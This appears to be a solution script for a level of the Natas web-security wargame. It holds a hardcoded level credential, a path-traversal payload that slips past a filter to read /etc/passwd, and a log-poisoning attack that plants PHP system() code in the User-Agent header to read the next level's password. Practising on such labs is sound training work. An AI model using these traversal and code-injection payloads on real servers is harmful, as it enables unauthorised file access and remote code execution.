import natasX

natas = natasX

#print(natas.natasX(25, "GHF6X7YwACaYYssHVY05cFq83hRktl4c", endpoint="?lang=....//....//....//....//....//....//etc/passwd").text)

cookie = natas.natasX(25, "GHF6X7YwACaYYssHVY05cFq83hRktl4c").cookies.get("PHPSESSID")
print(cookie)

print(natas.natasX(
    25,
    "GHF6X7YwACaYYssHVY05cFq83hRktl4c",
    endpoint=f'?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookie}.log',
    cookies={"PHPSESSID": cookie},
    headers={"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
).text)
